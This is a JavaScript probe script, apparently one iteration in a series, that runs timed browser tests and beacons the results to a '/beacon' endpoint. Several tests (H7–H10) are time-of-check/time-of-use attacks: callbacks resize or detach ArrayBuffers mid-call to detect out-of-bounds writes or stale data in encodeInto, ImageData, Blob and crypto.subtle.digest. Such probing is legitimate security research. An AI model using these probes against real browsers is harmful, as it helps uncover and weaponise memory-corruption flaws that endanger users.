// p121 — Isolate hanging tests from p119/p120 with 5-second timeouts
// p119 died after S4 (S5 TEE never completed), p120 died after S1
// Each test gets a Promise.race timeout so we can identify the exact hang point
(function(){
  var rid = 'v121h' + Math.random().toString(36).slice(2,15);
  function beacon(tag, data) {
    var body = typeof data === 'object' ? JSON.stringify(data) : String(data);
    try { navigator.sendBeacon('/beacon/V121H-' + tag, JSON.stringify({r:rid,b:body})); } catch(e){}
    try { fetch('/beacon/V121H-' + tag, {method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){}); } catch(e2){}
  }
  beacon('L', 'probe121-start');

  function withTimeout(fn, ms) {
    return Promise.race([
      fn(),
      new Promise(function(_, reject) {
        setTimeout(function() { reject(new Error('TIMEOUT_' + ms + 'ms')); }, ms);
      })
    ]);
  }

  var tests = [];
  function addTest(name, fn) { tests.push({name: name, fn: fn}); }

  // H1: ReadableStream tee + cancel (p119 S5 — suspected hang)
  addTest('H1-TEE', function() {
    return withTimeout(async function() {
      var r = {};
      var pullCount = 0;
      var rs = new ReadableStream({
        pull: function(ctrl) {
          pullCount++;
          if (pullCount > 20) { ctrl.close(); return; }
          ctrl.enqueue(new Uint8Array(256).fill(pullCount));
        }
      });
      var branches = rs.tee();
      var r1 = branches[0].getReader();
      var r2 = branches[1].getReader();
      var b1 = 0;
      for (var i = 0; i < 3; i++) {
        var c = await r1.read();
        if (!c.done) b1++;
      }
      r1.releaseLock();
      await branches[0].cancel('test');
      var b2 = 0;
      while (true) {
        var c2 = await r2.read();
        if (c2.done) break;
        b2++;
        if (b2 > 30) break;
      }
      r.b1 = b1; r.b2 = b2; r.pulls = pullCount;
      return r;
    }, 5000);
  });

  // H2: Compress→Decompress with buffer detach (p119 S6)
  addTest('H2-COMPDETACH', function() {
    return withTimeout(async function() {
      var r = {};
      var cs = new CompressionStream('gzip');
      var input = new TextEncoder().encode('Hello '.repeat(1000));
      var csW = cs.writable.getWriter();
      var csR = cs.readable.getReader();
      csW.write(input);
      csW.close();
      var compressed = [];
      while (true) {
        var ch = await csR.read();
        if (ch.done) break;
        compressed.push(ch.value);
      }
      r.compChunks = compressed.length;
      var ds = new DecompressionStream('gzip');
      var dsW = ds.writable.getWriter();
      var dsR = ds.readable.getReader();
      for (var i = 0; i < compressed.length; i++) dsW.write(compressed[i]);
      dsW.close();
      var decompLen = 0;
      while (true) {
        var dc = await dsR.read();
        if (dc.done) break;
        decompLen += dc.value.length;
      }
      r.decompLen = decompLen;
      r.roundTrip = decompLen === input.length;
      return r;
    }, 5000);
  });

  // H3: WritableStream abort during write (p119 S7)
  addTest('H3-WABORT', function() {
    return withTimeout(async function() {
      var r = {};
      var writeCount = 0;
      var ws = new WritableStream({
        write: function() {
          writeCount++;
          return new Promise(function(res) { setTimeout(res, 10); });
        },
        abort: function(reason) { r.abortReason = String(reason).slice(0,40); }
      });
      var w = ws.getWriter();
      var p1 = w.write(new Uint8Array(100));
      var p2 = w.write(new Uint8Array(200));
      var pA = w.abort('test');
      try { await p1; } catch(e) { r.w1 = e.constructor.name; }
      try { await p2; } catch(e) { r.w2 = e.constructor.name; }
      try { await pA; } catch(e) { r.abort = e.constructor.name; }
      r.writes = writeCount;
      return r;
    }, 5000);
  });

  // H4: ResizableArrayBuffer + streams (p119 S8)
  addTest('H4-RAB-STREAM', function() {
    return withTimeout(async function() {
      var r = {};
      var rab = new ArrayBuffer(256, {maxByteLength: 4096});
      new Uint8Array(rab).fill(0xAA);
      var chunks = [];
      var rs = new ReadableStream({
        start: function(ctrl) {
          ctrl.enqueue(new Uint8Array(rab));
          rab.resize(512);
          r.resized = rab.byteLength;
          ctrl.enqueue(new Uint8Array(rab));
          ctrl.close();
        }
      });
      var rd = rs.getReader();
      while (true) {
        var c = await rd.read();
        if (c.done) break;
        chunks.push({len: c.value.length, b0: c.value[0]});
      }
      r.chunks = chunks;
      // structuredClone of RAB
      var rab2 = new ArrayBuffer(128, {maxByteLength: 1024});
      new Uint8Array(rab2).fill(0xCC);
      var cl = structuredClone(rab2);
      r.cloneLen = cl.byteLength;
      r.cloneResizable = cl.resizable;
      return r;
    }, 5000);
  });

  // H5: Reader lock release during pending read (p119 S9)
  addTest('H5-LOCKRACE', function() {
    return withTimeout(async function() {
      var r = {};
      var rs = new ReadableStream({
        pull: function(ctrl) {
          return new Promise(function(res) {
            setTimeout(function() { ctrl.enqueue(new Uint8Array([1,2,3])); res(); }, 50);
          });
        }
      });
      var reader = rs.getReader();
      var readP = reader.read();
      try {
        reader.releaseLock();
        r.released = 'ok';
      } catch(e) {
        r.released = e.constructor.name + ':' + e.message.slice(0,60);
      }
      try {
        var result = await readP;
        r.pending = 'resolved:done=' + result.done;
      } catch(e) {
        r.pending = e.constructor.name + ':' + e.message.slice(0,60);
      }
      return r;
    }, 5000);
  });

  // H6: Backpressure abuse — negative/NaN/Infinity sizes (p119 S10)
  addTest('H6-BACKPRESSURE', function() {
    return withTimeout(async function() {
      var r = {};
      try {
        var ts = new TransformStream({}, new CountQueuingStrategy({highWaterMark: -1}));
        r.negHWM = 'created';
      } catch(e) { r.negHWM = e.constructor.name; }
      try {
        var ts2 = new TransformStream({}, new CountQueuingStrategy({highWaterMark: Infinity}));
        r.infHWM = 'created';
      } catch(e) { r.infHWM = e.constructor.name; }
      // Custom size() returning bad values
      var sizeCalls = 0;
      try {
        var ts3 = new TransformStream({
          transform: function(c, ctrl) { ctrl.enqueue(c); }
        }, undefined, {
          highWaterMark: 1,
          size: function() { sizeCalls++; if (sizeCalls===3) return -999; return 1; }
        });
        var w = ts3.writable.getWriter();
        var rd = ts3.readable.getReader();
        for (var i = 0; i < 5; i++) {
          try { await w.write(new Uint8Array([i])); } catch(e) { r['w'+i] = e.constructor.name; break; }
        }
        r.sizeCalls = sizeCalls;
      } catch(e) { r.customSize = e.constructor.name; }
      // Rapid create/destroy
      var created = 0;
      for (var j = 0; j < 100; j++) {
        var cs = new CompressionStream('gzip');
        cs.writable.getWriter().close();
        created++;
      }
      r.rapidCreate = created;
      return r;
    }, 5000);
  });

  // H7: TextEncoder.encodeInto TOCTOU — valueOf on width param resizes RAB
  addTest('H7-ENCODEINTO', function() {
    return withTimeout(async function() {
      var r = {};
      // encodeInto with a RAB-backed Uint8Array where toString on input resizes
      try {
        var rab = new ArrayBuffer(256, {maxByteLength: 4096});
        var dst = new Uint8Array(rab);
        dst.fill(0xBB);
        var poison = {
          toString: function() {
            rab.resize(16); // shrink underneath
            return 'A'.repeat(200);
          }
        };
        var enc = new TextEncoder();
        var result = enc.encodeInto(poison, dst);
        r.read = result.read;
        r.written = result.written;
        r.rabNow = rab.byteLength;
        r.dstLen = dst.length;
        // Check if data was written past the new boundary
        rab.resize(256);
        var view = new Uint8Array(rab);
        var nonBB = 0;
        for (var i = 16; i < 256; i++) {
          if (view[i] !== 0xBB && view[i] !== 0x00) nonBB++;
        }
        r.writtenPastBoundary = nonBB;
        r.OOB_WRITE = nonBB > 0;
      } catch(e) {
        r.encodeInto = e.constructor.name + ':' + e.message.slice(0,80);
      }
      return r;
    }, 5000);
  });

  // H8: ImageData constructor with valueOf that resizes RAB
  addTest('H8-IMAGEDATA', function() {
    return withTimeout(async function() {
      var r = {};
      try {
        var rab = new ArrayBuffer(400, {maxByteLength: 8000});
        var data = new Uint8ClampedArray(rab);
        data.fill(0xFF);
        var poisonW = {
          valueOf: function() {
            rab.resize(16); // shrink underneath
            return 10; // width = 10 → needs 10*10*4 = 400 bytes
          }
        };
        try {
          var img = new ImageData(data, poisonW, 10);
          r.created = true;
          r.imgW = img.width;
          r.imgH = img.height;
          r.dataLen = img.data.length;
        } catch(e) {
          r.created = false;
          r.err = e.constructor.name + ':' + e.message.slice(0,80);
        }
        r.rabNow = rab.byteLength;
      } catch(e) {
        r.imageData = e.constructor.name + ':' + e.message.slice(0,80);
      }
      return r;
    }, 5000);
  });

  // H9: Blob constructor with toString that detaches ArrayBuffer
  addTest('H9-BLOBTOCTOU', function() {
    return withTimeout(async function() {
      var r = {};
      try {
        var buf1 = new ArrayBuffer(4096);
        new Uint8Array(buf1).fill(0xAA);
        var poison = {
          toString: function() {
            // Detach buf1 via transfer
            var mc = new MessageChannel();
            mc.port1.postMessage('x', [buf1]);
            return 'poison';
          }
        };
        // Blob parts: [buf1, poison] — buf1 cached, then poison.toString detaches buf1
        var blob = new Blob([buf1, poison]);
        r.blobSize = blob.size;
        r.buf1Detached = buf1.byteLength === 0;
        // Read blob contents to check if detached buffer data is in there
        var text = await blob.text();
        r.textLen = text.length;
        r.hasPoison = text.indexOf('poison') >= 0;
        // Check if buf1's original data is in the blob
        var bytes = new Uint8Array(await blob.arrayBuffer());
        var aaCount = 0;
        for (var i = 0; i < Math.min(bytes.length, 4096); i++) {
          if (bytes[i] === 0xAA) aaCount++;
        }
        r.aaBytes = aaCount;
        r.STALE_DATA = aaCount > 0 && buf1.byteLength === 0;
      } catch(e) {
        r.blob = e.constructor.name + ':' + e.message.slice(0,80);
      }
      return r;
    }, 5000);
  });

  // H10: crypto.subtle.digest with buffer detach via getter
  addTest('H10-CRYPTODETACH', function() {
    return withTimeout(async function() {
      var r = {};
      try {
        var buf = new ArrayBuffer(1024);
        new Uint8Array(buf).fill(0x41);
        var view = new Uint8Array(buf);
        // digest the view, then try to detach during async operation
        var digestP = crypto.subtle.digest('SHA-256', view);
        // Detach immediately after calling digest
        var mc = new MessageChannel();
        mc.port1.postMessage('x', [buf]);
        r.detachedAfterDigest = buf.byteLength === 0;
        try {
          var hash = await digestP;
          r.hashLen = hash.byteLength;
          r.digestOK = true;
          // Check if hash is of the ORIGINAL data or of the detached buffer
          var hashView = new Uint8Array(hash);
          r.hash0 = hashView[0].toString(16);
          r.hash1 = hashView[1].toString(16);
        } catch(e) {
          r.digestErr = e.constructor.name + ':' + e.message.slice(0,60);
        }
      } catch(e) {
        r.crypto = e.constructor.name + ':' + e.message.slice(0,80);
      }
      return r;
    }, 5000);
  });

  async function runAll() {
    for (var i = 0; i < tests.length; i++) {
      var t = tests[i];
      try {
        var result = await t.fn();
        beacon(t.name, result);
      } catch(e) {
        beacon(t.name, {error: e.constructor.name + ':' + e.message.slice(0,200)});
      }
    }
    beacon('Z', 'probe121-done');
  }
  runAll();
})();
